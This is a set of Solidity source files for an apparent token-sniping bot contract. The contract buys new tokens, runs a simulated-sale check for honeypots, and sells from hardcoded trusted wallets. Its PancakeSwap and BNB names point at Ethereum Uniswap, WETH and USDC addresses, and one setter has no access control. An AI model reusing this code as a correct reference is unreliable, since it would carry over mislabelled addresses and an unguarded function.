{"AutoProxySwap.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\r\npragma solidity \u003e0.6.99 ;\r\npragma experimental ABIEncoderV2;\r\nimport \"./safemath.sol\";\r\nimport \"./uniswaplib.sol\";\r\n\r\ncontract SwapProxy is Ownable{\r\n    using SafeERC20 for IERC20;\r\n    using SafeMath for uint;\r\n    address public WBNB;\r\n    address public BUSD;\r\n    address public USDT;\r\n    address public swap_factory_address         =   address(0);\r\n    uint256 public swap_max_amount              =   200000000000000000;\r\n    uint256 public swap_max_times               =   10;\r\n    uint256 public swap_sell_percent            =   100;\r\n    uint256 public swap_max_fee                 =   35;\r\n    mapping(address =\u003e uint256) public swap_spend_used;\r\n    mapping(address =\u003e bool) public swap_token_whitelisted;\r\n    mapping(address =\u003e bool) public swap_success_sell;\r\n    address[]    public swap_trusted_wallets    =   [0xfC7f92581e727C04d629176DE8D1F7CC4A4A3A2E,0x605c73833c2E5b4C50cC740414f9CF033D4E1b92, 0xF5a511bf55Eabd2703437797E1F57309B9d113C8,0xdeEeb668Fa4aA5A1b16e39Feb18fEe3358e44629, 0x5b3Bcc7D41Ac31BBB0DF826bC87d840a66758886,0x204Aa38D0600E58E47a1277d4cBD573A98af8637, 0x52667E6D66e9987C077AA16A7d79A1A901546149,0xee49b612359f717a403275FD16d008E26173D3A0,0x35d3B9bBd70c1bAbf858A0C0267A182081b616dA, 0xB9cCBd81eA0403033435f481DDA1385a5EB9C8C9];\r\n    IPancakeV2Router public swap_router;\r\n\r\n    event TradeLog(string message);\r\n    event SuccessBuy(address target);\r\n    event SuccessSell(address target);\r\n\r\n    constructor() payable {\r\n        swap_router                             =   IPancakeV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        swap_factory_address                    =   swap_router.factory();\r\n        WBNB                                    =   0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        BUSD                                    =   0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\r\n        USDT                                    =   0xdAC17F958D2ee523a2206206994597C13D831ec7;\r\n        IERC20(WBNB).safeApprove(address(this),uint256(-1));\r\n    }\r\n\r\n    modifier onlyTrusted(){\r\n        if(msg.sender == owner){\r\n            _;\r\n            return ;\r\n        }\r\n        for(uint i=0;i\u003cswap_trusted_wallets.length;i++){\r\n            if(swap_trusted_wallets[i] == msg.sender){\r\n                _;\r\n                return ;\r\n            }\r\n        }\r\n        revert(\"Error:Not trusted wallet!\");\r\n    }\r\n\r\n    function getLiquiditySourceToken(address target) public view returns(address){\r\n        uint liquidity              =   0;\r\n        address factory             =   swap_factory_address;\r\n        address source_token        =   address(0);\r\n        address[] memory path       =   new address[](3);\r\n        IPancakeFactory iFactory    =   IPancakeFactory(factory);\r\n        path[0]                     =   WBNB;\r\n        path[1]                     =   BUSD;\r\n        path[2]                     =   USDT;\r\n        for(uint256 i = 0;i \u003c 3;i++){\r\n            if(iFactory.getPair(path[i],target) == address(0)){\r\n                continue;\r\n            }\r\n            (uint reserveIn, uint reserveOut) = PancakeLibrary.getReserves(factory, path[i], target);\r\n            if(reserveIn == 0 || reserveOut == 0){\r\n                continue;\r\n            }\r\n            if(reserveOut \u003e liquidity){\r\n                liquidity           =   reserveOut;\r\n                source_token        =   path[i];\r\n            }\r\n        }\r\n        return source_token;\r\n    }\r\n\r\n    function getCurrentSpendAmountByReceiveAmount(uint spend_amount,uint receive_amount,address factory,address[] memory  path) internal view returns(uint){\r\n        uint amount                 =   spend_amount;\r\n        uint[] memory amountOut     =   PancakeLibrary.getAmountsOut(factory, spend_amount, path);\r\n        if(amountOut[amountOut.length-1] \u003e= receive_amount){\r\n            uint[] memory amountIn  =   PancakeLibrary.getAmountsIn(factory, receive_amount , path);\r\n            amount                  =   amountIn[0];\r\n        }\r\n        amount                      =   amount \u003c= address(this).balance ? amount:address(this).balance;\r\n        return amount;\r\n    }\r\n\r\n    function _swapSupportingFeeOnTransferTokens(address factory,address[] memory path, address _to) internal  {\r\n        for (uint i; i \u003c path.length - 1; i++) {\r\n            (address input, address output) = (path[i], path[i + 1]);\r\n            (address token0,) = PancakeLibrary.sortTokens(input, output);\r\n            IPancakePair pair = IPancakePair(PancakeLibrary.pairFor(factory, input, output));\r\n            uint amountInput;\r\n            uint amountOutput;\r\n            { // scope to avoid stack too deep errors\r\n            (uint reserve0, uint reserve1,) = pair.getReserves();\r\n            (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\r\n            amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);\r\n            amountOutput = PancakeLibrary.getAmountOut(amountInput, reserveInput, reserveOutput);\r\n            }\r\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));\r\n            address to = i \u003c path.length - 2 ? PancakeLibrary.pairFor(factory, output, path[i + 2]) : _to;\r\n            pair.swap(amount0Out, amount1Out, to, new bytes(0));\r\n        }\r\n    }\r\n\r\n    function pancakeSell(address factory,address[] memory path,uint256 amount,uint256 bnbMin,address receiver) internal {\r\n        require(path[path.length - 1] == WBNB, \u0027PancakeRouter: INVALID_PATH\u0027);\r\n        TransferHelper.safeTransferFrom(\r\n            path[0], receiver, PancakeLibrary.pairFor(factory, path[0], path[1]), amount\r\n        );\r\n        _swapSupportingFeeOnTransferTokens(factory,path, address(this));\r\n        uint amountOut = IERC20(path[path.length-1]).balanceOf(address(this));\r\n        require(amountOut \u003e= bnbMin, \u0027ERROR: INSUFFICIENT_OUTPUT_AMOUNT\u0027);\r\n        IWETH(path[path.length-1]).withdraw(amountOut);\r\n        TransferHelper.safeTransferETH(address(this), amountOut);\r\n    }\r\n\r\n    function sellToken(address target,uint index) public onlyTrusted {\r\n        bool selled                 =   swap_success_sell[target];\r\n        require(!selled,\"Error:Target token already sold!\");\r\n        address source              =   WBNB;\r\n        address factory             =   swap_factory_address;\r\n        address[] memory path       =   getBuyPathByToken(target,source);\r\n        uint percent                =   swap_sell_percent / 100;\r\n        path                        =   getSellPathByBuyPath(path);\r\n        for(uint256 i = index;i \u003c swap_trusted_wallets.length;i++){\r\n            address receiver        =   swap_trusted_wallets[i];\r\n            uint balance            =   IERC20(target).balanceOf(receiver);\r\n            if(balance \u003e 0){\r\n                pancakeSell(factory,path,balance * percent,0,receiver);\r\n                if(!selled){\r\n                    swap_success_sell[target]   =   true;\r\n                }\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function isSellNormally(address factory,address[] memory buy_path,uint256 buy_spend_bnb,uint max_fee) public{\r\n        max_fee                     =   max_fee \u003e 0 ? max_fee:swap_max_fee;\r\n        address spender             =   tx.origin;\r\n        address[] memory sell_path  =   getSellPathByBuyPath(buy_path);\r\n        uint256 sell_amount         =   uint256(IERC20(sell_path[0]).balanceOf(spender));\r\n        uint256 bnbMin              =   uint256(buy_spend_bnb * (100 - max_fee) / 100);\r\n        pancakeSell(factory,sell_path,sell_amount,bnbMin,spender);\r\n        revert(\"s\");\r\n    }\r\n\r\n    function ensureSellWorks(address factory,address[] memory path,uint256 buy_spend_bnb,uint max_fee) public virtual {\r\n        try this.isSellNormally(factory,path,buy_spend_bnb,max_fee){\r\n        } catch Error(string memory revertReason) {\r\n            if (bytes(revertReason).length == bytes(\"s\").length){\r\n                \r\n            }else{\r\n                revert(revertReason);\r\n            }\r\n        } catch (bytes memory returnData) {\r\n            revert(string(returnData));\r\n        }\r\n    }\r\n\r\n    function getSellPathByBuyPath(address[] memory path) internal pure returns (address[] memory){\r\n        address[] memory sell_path  =   new address[](path.length);\r\n        for(uint256 i = 0 ;i \u003c path.length; i++){\r\n            sell_path[i]            =   path[path.length - 1 - i];\r\n        }\r\n        return sell_path;\r\n    }\r\n\r\n    function getBuyPathByToken(address target,address source) internal view returns (address[] memory){\r\n        address weth                =   WBNB;\r\n        address[] memory path       =   source == weth ? new address[](2):new address[](3);\r\n        path[0]                     =   weth;\r\n        if(source == weth){\r\n            path[1]                 =   target;\r\n        }else if(source == BUSD){\r\n            path[1]                 =   BUSD;\r\n            path[2]                 =   target;\r\n        }else{\r\n            path[1]                 =   USDT;\r\n            path[2]                 =   target;\r\n        }\r\n        return path;\r\n    }\r\n\r\n    function swapBNBForTokens(address target,uint spend_amount,uint receive_amount,uint max_fee,bool check_sell) public onlyTrusted {\r\n        uint256 init_balance        =   address(this).balance;\r\n        if(init_balance \u003c= 0){\r\n            return ;\r\n        }\r\n        address weth                =   0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address factory             =   0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\r\n        address[] memory path       =   new address[](2);\r\n        path[0]                     =   weth;\r\n        path[1]                     =   address(target);\r\n        uint current_spend_amount   =   receive_amount==0 ? spend_amount:getCurrentSpendAmountByReceiveAmount(spend_amount,receive_amount,factory,path);\r\n        if(current_spend_amount \u003c= 0){\r\n            return ;\r\n        }\r\n        IWETH(weth).deposit{value: current_spend_amount}();\r\n        assert(IWETH(weth).transfer(PancakeLibrary.pairFor(factory, path[0], path[1]), current_spend_amount));\r\n        _swapSupportingFeeOnTransferTokens(factory,path, payable(tx.origin));\r\n        uint current_balance        =   address(this).balance;\r\n        uint buy_spend_bnb          =   uint(init_balance - current_balance);\r\n        if(check_sell){\r\n            ensureSellWorks(factory,path,buy_spend_bnb,max_fee);\r\n            uint balance_max        =   uint(swap_max_amount * swap_max_times);\r\n            if(address(this).balance    \u003e=  balance_max){\r\n                withdrawToOwner(balance_max);\r\n            }\r\n        }\r\n    }\r\n\r\n    function withdrawERC20Token(address token,uint256 amount) public onlyOwner{\r\n        if(amount == 0){\r\n            amount                  =   IERC20(token).balanceOf(address(this));\r\n        }\r\n        IERC20(token).transfer(owner,amount);\r\n    }\r\n\r\n    function withdrawBNB(uint remaining) external onlyOwner{\r\n        withdrawToOwner(remaining);\r\n    }\r\n\r\n    function withdrawToOwner(uint remaining) internal{\r\n        payable(owner).transfer(address(this).balance-remaining);\r\n    }\r\n\r\n    function setTrustedWallets(address[] memory wallets) public onlyOwner{\r\n        swap_trusted_wallets    =   wallets;\r\n    }\r\n\r\n    function setSwapMaxAmount(uint amount) public onlyOwner{\r\n        swap_max_amount          =   amount;\r\n    }\r\n\r\n    function setSwapMaxTimes(uint times) public onlyOwner{\r\n        swap_max_times          =   times;\r\n    }\r\n\r\n    function setSwapMaxFee(uint fee) public onlyOwner{\r\n        swap_max_fee             =   fee;\r\n    }\r\n\r\n    function setSwapSellPercent(uint percent) public onlyOwner{\r\n        swap_sell_percent        =   percent;\r\n    }\r\n\r\n    function canBuyToken(address target) external view returns(bool){\r\n        if(address(this).balance \u003c= 0){\r\n            return false;\r\n        }\r\n        address source           =  getLiquiditySourceToken(target);\r\n        if(source != address(0)){\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    receive() external payable {\r\n        \r\n    }\r\n\r\n    function setTargetTokenWhitelist(address target) external {\r\n        swap_token_whitelisted[target] = true;\r\n    }\r\n}"},"safemath.sol":{"content":"library SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b \u003c= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c \u003e= a);\r\n        return c;\r\n    }\r\n}\r\n"},"uniswaplib.sol":{"content":"pragma solidity \u003e=0.7.0;\r\nimport \"./safemath.sol\";\r\ninterface IPancakeFactory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IPancakePair {\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    function safeApprove(IERC20 token, address spender, uint256 value) internal {\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n\r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length \u003e 0) {\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\nlibrary PancakeLibrary {\r\n    using SafeMath for uint;\r\n\r\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\r\n        require(tokenA != tokenB, \u0027PancakeLibrary: IDENTICAL_ADDRESSES\u0027);\r\n        (token0, token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        require(token0 != address(0), \u0027PancakeLibrary: ZERO_ADDRESS\u0027);\r\n    }\r\n\r\n\r\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\r\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\r\n        pair = address(uint(keccak256(abi.encodePacked(\r\n                hex\u0027ff\u0027,\r\n                factory,\r\n                keccak256(abi.encodePacked(token0, token1)),\r\n                hex\u002796e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f\u0027\r\n            ))));\r\n    }\r\n\r\n    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {\r\n        (address token0,) = sortTokens(tokenA, tokenB);\r\n        pairFor(factory, tokenA, tokenB);\r\n        (uint reserve0, uint reserve1,) = IPancakePair(pairFor(factory, tokenA, tokenB)).getReserves();\r\n        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\r\n    }\r\n\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {\r\n        require(amountIn \u003e 0, \u0027PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT\u0027);\r\n        require(reserveIn \u003e 0 \u0026\u0026 reserveOut \u003e 0, \u0027PancakeLibrary: INSUFFICIENT_LIQUIDITY\u0027);\r\n        uint amountInWithFee = amountIn.mul(997);\r\n        uint numerator = amountInWithFee.mul(reserveOut);\r\n        uint denominator = reserveIn.mul(1000).add(amountInWithFee);\r\n        amountOut = numerator / denominator;\r\n    }\r\n\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {\r\n        require(amountOut \u003e 0, \u0027PancakeLibrary: INSUFFICIENT_OUTPUT_AMOUNT\u0027);\r\n        require(reserveIn \u003e 0 \u0026\u0026 reserveOut \u003e 0, \u0027PancakeLibrary: INSUFFICIENT_LIQUIDITY\u0027);\r\n        uint numerator = reserveIn.mul(amountOut).mul(1000);\r\n        uint denominator = reserveOut.sub(amountOut).mul(997);\r\n        amountIn = (numerator / denominator).add(1);\r\n    }\r\n\r\n    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {\r\n        require(path.length \u003e= 2, \u0027PancakeLibrary: INVALID_PATH\u0027);\r\n        amounts = new uint[](path.length);\r\n        amounts[0] = amountIn;\r\n        for (uint i; i \u003c path.length - 1; i++) {\r\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\r\n            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\r\n        }\r\n    }\r\n\r\n    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {\r\n        require(path.length \u003e= 2, \u0027PancakeLibrary: INVALID_PATH\u0027);\r\n        amounts = new uint[](path.length);\r\n        amounts[amounts.length - 1] = amountOut;\r\n        for (uint i = path.length - 1; i \u003e 0; i--) {\r\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);\r\n            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);\r\n        }\r\n    }\r\n}\r\n\r\nlibrary TransferHelper {\r\n\r\n    function safeTransfer(address token, address to, uint value) internal {\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\r\n        require(success \u0026\u0026 (data.length == 0 || abi.decode(data, (bool))), \u0027TransferHelper: TRANSFER_FAILED\u0027);\r\n    }\r\n\r\n    function safeTransferFrom(address token, address from, address to, uint value) internal {\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\r\n        require(success \u0026\u0026 (data.length == 0 || abi.decode(data, (bool))), \u0027TransferHelper: TRANSFER_FROM_FAILED\u0027);\r\n    }\r\n\r\n    function safeTransferETH(address to, uint value) internal {\r\n        (bool success,) = to.call{value:value}(new bytes(0));\r\n        require(success, \u0027TransferHelper: ETH_TRANSFER_FAILED\u0027);\r\n    }\r\n}\r\n\r\ncontract Ownable{\r\n    address public owner;\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner(){\r\n        require(msg.sender == owner, \"Owership required\");\r\n        _;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint amount\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface IPancakeV2Router {\r\n    function factory() external pure returns (address);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] memory path,\r\n        address to,\r\n        uint deadline\r\n     ) external payable;\r\n}\r\n\r\npragma solidity \u003e=0.5.0;\r\n\r\ninterface IWETH {\r\n    function deposit() external payable;\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function withdraw(uint) external;\r\n}\r\n"}}